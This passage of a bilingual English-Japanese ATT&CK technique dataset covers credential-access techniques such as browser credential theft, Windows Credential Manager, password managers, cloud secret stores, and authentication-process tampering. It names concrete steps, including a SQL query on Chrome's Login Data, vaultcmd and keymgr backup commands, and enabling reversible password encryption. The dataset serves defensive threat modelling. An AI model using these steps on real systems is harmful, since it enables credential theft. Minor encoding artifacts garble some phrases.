SecurityD)特権を持つ攻撃者は、`securityd`のメモリをスキャンしてユーザーのログオンキーチェーンを復号する正しいキーのシーケンスを発見できる可能性がある。これにより、ユーザー、WiFi、メール、ブラウザ、証明書、セキュアノートなど、様々な平文パスワードが攻撃者に提供される可能性がある。(引用元: OS X Keychain)(引用元: OSX Keydnap malware) El Capitan以前のOS Xでは、rootアクセス権を持つユーザーはログイン済みユーザーの平文キーチェーンパスワードを読み取ることが可能です。これはAppleのキーチェーン実装が、ユーザーが繰り返しパスワードを要求されないようこれらの認証情報をキャッシュすることを許可しているためです。(引用元: OS X Keychain)(引用元: DA外部、OS X Way) Appleの`securityd`ユーティリティはユーザーのログインパスワードを取得し、PBKDF2で暗号化してこのマスターキーをメモリに保存します。Appleはユーザーのパスワードを暗号化するための一連の鍵とアルゴリズムも使用しますが、一度マスターキーが判明すれば、攻撃者は他の値を順に試すだけで最終的なパスワードを解読できます。(引用元: OS X Keychain),credential-access,Linux;macOS,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM);Wireless Access Point,subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--1a80d097-54df-41d8-9d33-34e755ec5e72,2020-02-12T18:56:31.051Z,2025-04-15T23:05:25.349Z,,,,
T1555.003,T1555,Credentials from Web Browsers,Webブラウザからの認証情報,"Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers. For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018) Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004). Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016) After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).","攻撃者は、対象ブラウザ固有のファイルを読み取ることでウェブブラウザから認証情報を取得する可能性がある。(引用: Talos Olympic Destroyer 2018) ウェブブラウザは通常、ウェブサイトユーザー名やパスワードなどの認証情報を保存し、将来の手動入力不要を実現する。認証情報は通常、暗号化された形式で認証情報ストア内に保存されるが、ウェブブラウザから平文の認証情報を抽出する手法は存在する。 例えばWindowsシステムでは、Google Chromeから暗号化された認証情報を取得するには、データベースファイル<code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code>を読み込み、SQLクエリ<code>SELECT action_url, username_value, password_value FROM logins;</code>を実行する。 平文パスワードは、暗号化された認証情報をWindows API関数<code>CryptUnprotectData</code>に渡すことで取得可能である。この関数は被害者のキャッシュされたログオン認証情報を復号鍵として使用する。(引用元: Microsoft CryptUnprotectData 2018年4月) 攻撃者はFireFox、Safari、Edgeなどの主要ウェブブラウザに対しても同様の手順を実行している。(引用元: Proofpoint Vega Credential Stealer 2018年5月)(引用元: FireEye HawkEye Malware 2017年7月) Windowsは、Internet ExplorerおよびMicrosoft Edgeの認証情報を[Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004)が管理するCredential Lockerに保存します。 攻撃者はまた、ウェブブラウザのプロセスメモリをスキャンし、認証情報に一致するパターンを検索することで認証情報を取得する可能性があります。（引用元：GitHub Mimikittenz 2016年7月）ウェブブラウザから認証情報を取得した後、攻撃者はアクセス権限を拡大するため、異なるシステムやアカウント間で認証情報を流用しようとする可能性があります。ウェブブラウザから取得した認証情報が特権アカウント（例：ドメイン管理者）と重複する場合、これにより攻撃者の目的が大幅に達成される可能性があります。",credential-access,Linux;macOS;Windows,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;cloud_control_plane;file_storage_access;database_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8,2020-02-12T18:57:36.041Z,2025-04-15T22:12:28.087Z,,,,
T1555.004,T1555,Windows Credential Manager,Windows 資格情報マネージャー,"Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker) The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker. Credential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault) Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager) Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the “Back up... Ebutton on the “Stored User Names and Passwords EGUI. Password recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)",攻撃者はWindows資格情報マネージャーから資格情報を取得する可能性があります。資格情報マネージャーは、NTLMまたはKerberosによる認証を要求するウェブサイト、アプリケーション、デバイスへのサインイン用資格情報を「資格情報ロッカー」（旧称：Windows Vault）に保存します。（出典：Microsoft Credential Manager store）（出典：Microsoft Credential Locker）Windows資格情報マネージャーは、ウェブサイト用資格情報とアプリケーション/ネットワーク用資格情報を2つのロッカーで分離管理します。 [Web ブラウザからの認証情報](https://attack.mitre.org/techniques/T1555/003) の一部として、Internet Explorer および Microsoft Edge の Web サイト認証情報は認証情報マネージャーによって管理され、Web 認証情報ロッカーに保存されます。アプリケーションおよびネットワーク認証情報は Windows 認証情報ロッカーに保存されます。 認証情報ロッカーは、`%Systemdrive%\Users\\[ユーザー名]\AppData\Local\Microsoft\\[Vault/Credentials]\` 配下に存在する暗号化された `.vcrd` ファイルに認証情報を保存します。暗号化キーは通常、認証情報と同じフォルダーにある <code>Policy.vpol</code> というファイルで確認できます。(引用元: passcape Windows Vault)(引用元: Malwarebytes The Windows Vault)攻撃者は複数の手法でWindows資格情報マネージャーが管理する資格情報を列挙可能です。<code>vaultcmd.exe</code>はコマンドラインインターフェース経由で資格情報保管庫内の資格情報を列挙できるWindowsネイティブ実行ファイルです。攻撃者は資格情報保管庫内のファイルを直接読み取る方法でも資格情報を収集できます。 <code>CredEnumerateA</code>などのWindows APIも、クレデンシャルマネージャーが管理する認証情報を列挙するために悪用される可能性があります。(引用元: Microsoft CredEnumerate)(引用元: Delpy Mimikatz Crendential Manager) 攻撃者は認証情報のバックアップからも認証情報を取得する可能性があります。 資格情報のバックアップと復元は、<code>rundll32.exe keymgr.dll KRShowKeyMgr</code> を実行し、「保存されたユーザー名とパスワード」EGUI の「バックアップ... Eボタンを選択することで実行できます。パスワード回復ツールも、資格情報マネージャーから平文のパスワードを取得する可能性があります。(引用: Malwarebytes The Windows Vault),credential-access,Windows,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,AD / Directory Server;Backup Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--d336b553-5da9-46ca-98a8-0b23f49fb447,2020-11-23T15:35:53.793Z,2025-04-15T23:21:30.628Z,,,,
T1555.005,T1555,Password Managers,パスワードマネージャー,"Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019) Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610) Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.(Citation: Cyberreason Anchor December 2019)",攻撃者はサードパーティ製パスワード管理ツールからユーザー認証情報を取得する可能性がある。(出典: ise Password Manager 2019年2月)パスワード管理ツールは、通常暗号化されたデータベースにユーザー認証情報を保存するアプリケーションである。 認証情報は通常、ユーザーがデータベースのロックを解除するマスターパスワードを入力した後にアクセス可能になります。データベースのロックが解除されると、これらの認証情報はメモリにコピーされる可能性があります。これらのデータベースはディスク上のファイルとして保存される場合があります。(引用元: ise Password Manager 2019年2月) 攻撃者は、メモリからマスターパスワードや平文の認証情報を抽出することで、パスワードマネージャーからユーザー認証情報を取得する可能性があります。(引用元: FoxIT Wocao 2019年12月)(引用元: Github KeeThief) 攻撃者は[認証情報アクセスを目的とした悪用](https://attack.mitre.org/techniques/T1212)によりメモリから認証情報を抽出する可能性があります。(引用: NVD CVE-2019-3610) 攻撃者はまた、[パスワード推測](https://attack.mitre.org/techniques/T1110/001) によるブルートフォース攻撃を試みて、パスワード管理者のマスターパスワードを取得しようとする可能性がある。(引用: Cyberreason Anchor 2019年12月),credential-access,Linux;macOS;Windows,credential_abuse,credential_gain,authentication_system;user_interaction;file_storage_access;database_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--315f51f0-6b03-4c1e-bfb2-84740afb8e21,2021-01-22T16:08:40.629Z,2025-04-15T22:56:22.300Z,,,,
T1555.006,T1555,Cloud Secrets Management Stores,クラウドシークレット管理ストア,"Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault. Secrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables. If an adversary is able to gain sufficient privileges in a cloud environment  Efor example, by obtaining the credentials of high-privileged [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004) or compromising a service that has permission to retrieve secrets  Ethey may be able to request secrets from the secrets manager. This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure.(Citation: Permiso Scattered Spider 2023)(Citation: Sysdig ScarletEel 2.0 2023)(Citation: AWS Secrets Manager)(Citation: Google Cloud Secrets)(Citation: Microsoft Azure Key Vault) **Note:** this technique is distinct from [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005) in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.",攻撃者は、AWS Secrets Manager、GCP Secret Manager、Azure Key Vault、Terraform Vaultなどのクラウドネイティブ秘密管理ソリューションから認証情報を取得する可能性があります。秘密管理ソリューションは、パスワード、APIキー、その他の認証情報を安全に一元管理します。秘密管理ソリューションが使用されている場合、クラウドサービスは平文ファイルや環境変数に不安全に保存された秘密にアクセスする代わりに、APIリクエストを介して動的に認証情報を取得できます。 攻撃者がクラウド環境で十分な権限を取得した場合（例：高権限の[クラウドアカウント](https://attack.mitre.org/techniques/T1078/004)の認証情報を入手する、シークレット取得権限を持つサービスを侵害する）、シークレットマネージャーからシークレットを要求できる可能性があります。 これは、AWS の `get-secret-value`、GCP の `gcloud secrets describe`、Azure の `az key vault secret show` などのコマンドで実現できます。(引用元: Permiso Scattered Spider 2023)(引用元: Sysdig ScarletEel 2.0 2023)(引用元: AWS Secrets Manager)(引用元: Google Cloud Secrets)(引用元: Microsoft Azure Key Vault) **注:** この手法は、[Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005) とは異なり、インスタンスメタデータAPIを介さず、クラウドシークレットマネージャーから直接認証情報を要求する点で区別されます。,credential-access,IaaS,credential_abuse,credential_gain,authentication_system;privileged_account;endpoint_execution;cloud_control_plane;file_storage_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--cfb525cc-5494-401d-a82b-2539ca46a561,2023-09-25T12:41:26.501Z,2025-04-15T22:03:00.834Z,,,,
T1556,,Modify Authentication Process,認証プロセスの改変,"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078). Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",攻撃者は、ユーザー認証情報を取得したり、正当なアクセス権限のないアカウントへのアクセスを可能にするために、認証メカニズムやプロセスを改変する可能性があります。認証プロセスは、Windows ではローカルセキュリティ認証サーバー (LSASS) プロセスやセキュリティアカウントマネージャー (SAM)、Unix ベースのシステムではプラグイン可能な認証モジュール (PAM)、MacOS システムでは認証プラグインなど、認証情報の収集、保存、検証を担当するメカニズムによって処理されます。 認証プロセスを改変することで、攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用せずにサービスやシステムへの認証を成功させることが可能になる。 攻撃者は、このプロセスの一部を悪意を持って改変し、認証情報を漏洩させたり、認証メカニズムを迂回させたりする可能性があります。侵害された認証情報やアクセス権は、ネットワーク内のシステム上の様々なリソースに設定されたアクセス制御を迂回するために使用される可能性があり、さらには、VPN、Outlook Web Access、リモートデスクトップなどのリモートシステムや外部から利用可能なサービスへの永続的なアクセスに使用される可能性さえあります。,credential-access;defense-evasion;persistence,Windows;Linux;macOS;Network Devices;IaaS;SaaS;Office Suite;Identity Provider,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Network Device (FW/Proxy/AP);Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0005;TA0003,attack-pattern--f4c1826f-a322-41cd-9557-562100848c84,2020-02-11T19:01:56.887Z,2025-04-15T19:59:21.746Z,,,,
T1556.001,T1556,Domain Controller Authentication,ドメインコントローラー認証,"Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)",攻撃者は、ドメインコントローラー上の認証プロセスにパッチを適用し、標準的な認証メカニズムを迂回してアカウントへのアクセスを可能にする場合があります。マルウェアを使用して、ドメインコントローラー上の認証プロセスに偽の認証情報を注入し、任意のユーザーのアカウントや認証情報にアクセスするためのバックドアを作成する意図で利用されることがあります（例：[スケルトンキー](https://attack.mitre.org/software/S0007)）。 スケルトンキーは、攻撃者が標準認証システムを迂回するために使用できる認証情報を用いた、企業ドメインコントローラー認証プロセス（LSASS）へのパッチを通じて機能します。パッチ適用後、攻撃者は注入されたパスワードを使用して任意のドメインユーザーアカウントとして認証に成功できます（ドメインコントローラーの再起動によりスケルトンキーがメモリから消去されるまで）。 認証済みアクセスにより、単一要素認証環境内のホストやリソースへの制限のないアクセスが可能となる。（引用元：Dell Skeleton）,credential-access;defense-evasion;persistence,Windows,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0005;TA0003,attack-pattern--d4b96d2c-1032-4b22-9235-2b5b649d0605,2020-02-11T19:05:02.399Z,2025-04-15T22:21:45.658Z,,,,
T1556.002,T1556,Password Filter DLL,パスワード フィルター DLL,"Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)",攻撃者は、認証プロセスに悪意のあるパスワードフィルターDLLを登録し、検証中のユーザー認証情報を取得する可能性があります。Windowsパスワードフィルターは、ドメインアカウントとローカルアカウント双方のパスワードポリシー適用メカニズムです。フィルターはDLLとして実装され、パスワードポリシーに対する潜在的なパスワードの検証メソッドを含みます。 フィルターDLLは、ローカルアカウント向けにはローカルコンピュータに、ドメインアカウント向けにはドメインコントローラーに配置される。セキュリティアカウントマネージャー（SAM）に新規パスワードを登録する前に、ローカルセキュリティオーソリティ（LSA）は登録済み各フィルターに検証を要求する。登録済み全フィルターが検証を承認するまで、変更は有効化されない。 攻撃者は悪意のあるパスワードフィルターを登録し、ローカルコンピュータやドメイン全体から認証情報を収集できます。適切な検証を行うには、フィルターはLSAから平文の認証情報を受け取る必要があります。悪意のあるパスワードフィルターは、パスワード要求が行われるたびにこの平文認証情報を受け取ります。（引用元: Carnal Ownage Password Filters 2013年9月）,credential-access;defense-evasion;persistence,Windows,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;cloud_control_plane,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0005;TA0003,attack-pattern--3731fbcd-0e43-47ae-ae6c-d15e510f0d42,2020-02-11T19:05:45.829Z,2025-04-15T22:56:08.743Z,,,,
T1556.003,T1556,Pluggable Authentication Modules,プラグイン認証モジュール,"Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM) Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor) Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",攻撃者は、ユーザー認証情報へのアクセスや、本来許可されていないアカウントへのアクセスを可能にするため、プラグイン可能な認証モジュール（PAM）を改変する可能性があります。PAMは、多くのサービスの認証を制御する設定ファイル、ライブラリ、実行ファイルからなるモジュール式システムです。 最も一般的な認証モジュールは<code>pam_unix.so</code>であり、<code>/etc/passwd</code>および<code>/etc/shadow</code>からアカウント認証情報を取得・設定・検証する。(引用: Apple PAM)(引用: Man Pam_Unix)(引用: Red Hat PAM)攻撃者はPAMシステムのコンポーネントを改変しバックドアを作成する可能性がある。 <code>pam_unix.so</code> などの PAM コンポーネントは、攻撃者が提供する任意の値を正当な認証情報として受け入れるようにパッチを適用することができます。(引用: PAM Backdoor) PAM システムへの悪意のある変更は、認証情報を盗むために悪用される可能性もあります。 PAM はパスワードを保存しないため、PAM コンポーネントとの間で交換される値は平文である可能性があり、敵対者は PAM リソースにコードを感染させてユーザーの認証情報を収集する可能性があります。(引用: PAM Creds)(引用: Apple PAM),credential-access;defense-evasion;persistence,Linux;macOS,credential_abuse,credential_gain,authentication_system;user_interaction;email_infrastructure;file_storage_access,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0005;TA0003,attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771,2020-06-26T04:01:09.648Z,2025-04-15T22:57:26.573Z,,,,
T1556.004,T1556,Network Device Authentication,ネットワークデバイスの認証,"Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices. [Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password. The modification includes a specific password which is implanted in the operating system image via the patch. Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock)",攻撃者は[システムイメージの改変](https://attack.mitre.org/techniques/T1601/001)を利用して、オペレーティングシステムにパスワードをハードコードし、ネットワーク機器上のローカルアカウントに対するネイティブ認証メカニズムをバイパスする可能性があります。 [システムイメージの改変](https://attack.mitre.org/techniques/T1601)には、特定のパスワードを使用する攻撃者へのアクセスを提供するため、ネットワーク機器のOSに埋め込まれたコードが含まれる場合があります。この改変には、パッチを介してOSイメージに埋め込まれる特定のパスワードが含まれます。認証試行時、挿入されたコードはまずユーザー入力がパスワードかどうかを確認します。一致した場合、アクセスが許可されます。 そうでない場合、埋め込まれたコードは資格情報を転送し、有効な資格情報の可能性を検証します。（引用元：Mandiant - Synful Knock）,credential-access;defense-evasion;persistence,Network Devices,credential_abuse,credential_gain,authentication_system;user_interaction;network_connectivity,specified,Network Device (FW/Proxy/AP),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0005;TA0003,attack-pattern--fa44a152-ac48-441e-a524-dd7b04b8adcd,2020-10-19T17:58:04.155Z,2025-04-15T21:40:12.055Z,,,,
T1556.005,T1556,Reversible Encryption,可逆暗号化,"An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc) If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components: 1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code> 2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code> 3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>) 4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>) With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2) An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to ""Windows Server 2008"" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.",攻撃者は、Active Directory認証の暗号化プロパティを悪用し、Windowsシステム上の認証情報へのアクセスを得ることがあります。<code>AllowReversiblePasswordEncryption</code>プロパティは、アカウントの可逆パスワード暗号化が有効か無効かを指定します。 デフォルトではこのプロパティは無効化されており（代わりにユーザー認証情報は一方向ハッシュ関数の出力として保存される）、レガシーソフトウェアやその他のソフトウェアで必要とされる場合を除き有効化すべきではない。（引用元: store_pwd_rev_enc）このプロパティが有効化されている場合、および／または有効化後にユーザーがパスワードを変更した場合、攻撃者はプロパティ有効化後に作成／変更されたパスワードの平文を取得できる可能性がある。 パスワードを復号するには、攻撃者は以下の4つの要素を必要とします：1. Active Directoryユーザー構造<code>userParameters</code>内の暗号化パスワード<code>G$RADIUSCHAP</code> 2. 同じく<code>userParameters</code>内の16バイトのランダム生成値<code>G$RADIUSCHAPKEY</code> 3. グローバルLSAシークレット（<code>G$MSRADIUSCHAPKEY</code>） 4. リモートアクセスサブ認証DLL（<code>RASSFM.DLL</code>）にハードコードされた静的キー この情報があれば、攻撃者は暗号化キーを再現し、暗号化されたパスワード値を復号できる可能性があります。(Citation: how_pwd_rev_enc_1)(引用元: how_pwd_rev_enc_2) 攻撃者は、ローカルグループポリシーエディタ、ユーザープロパティ、細粒度パスワードポリシー (FGPP)、または ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) モジュールを介して、さまざまなスコープでこのプロパティを設定できます。 たとえば、ドメイン機能レベルが「Windows Server 2008」以上に設定されている場合、攻撃者は FGPP を実装してユーザーやグループに適用することができます。(引用: dump_pwd_dcsync) PowerShell では、攻撃者は <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code> などのコマンドを使用して、ユーザー設定に関連した変更を行うことができます。,credential-access;defense-evasion;persistence,Windows,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;endpoint_management;network_connectivity;cloud_control_plane,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0005;TA0003,attack-pattern--d50955c2-272d-4ac8-95da-10c29dda1c48,2022-01-13T20:02:28.349Z,2025-04-15T23:00:34.242Z,,,,
T1556.006,T1556,Multi-Factor Authentication,多要素認証,"Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts. Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD Conditional Access Exclusions) For example, modifying the Windows hosts file (`C:\windows\system32\drivers\etc\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a ""fail open"" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022)",攻撃者は、侵害されたアカウントへの持続的なアクセスを可能にするため、多要素認証（MFA）メカニズムを無効化または改変する可能性がある。攻撃者がMFA未設定のアカウントを侵害するか、[多要素認証要求生成](https://attack.mitre.org/techniques/T1621)などのMFA回避手法を用いてネットワークへのアクセス権を取得した後、そのアクセス権を利用してMFA防御機能を改変または完全に無効化することが可能である。 これは、Azure AD条件付きアクセスポリシーからのユーザー除外、脆弱な/攻撃者が制御する新たなMFA方式の登録、MFAプログラムや設定ファイルへの手動パッチ適用による想定機能のバイパスなど、正当な機能の悪用によって達成される。(引用元: Mandiant APT42)(引用元: Azure AD条件付きアクセス除外) 例えば、Windowsのホストファイル（`C:\windows\system32\drivers\etc\hosts`）を改変し、MFA呼び出しをMFAサーバーではなくローカルホストへリダイレクトすると、MFAプロセスが失敗する可能性があります。「失敗時開放」ポリシーが適用されている場合、本来なら成功する認証試行がMFAを強制せずにアクセス許可される恐れがあります。 (引用元: Russians Exploit Default MFA Protocol - CISA March 2022) 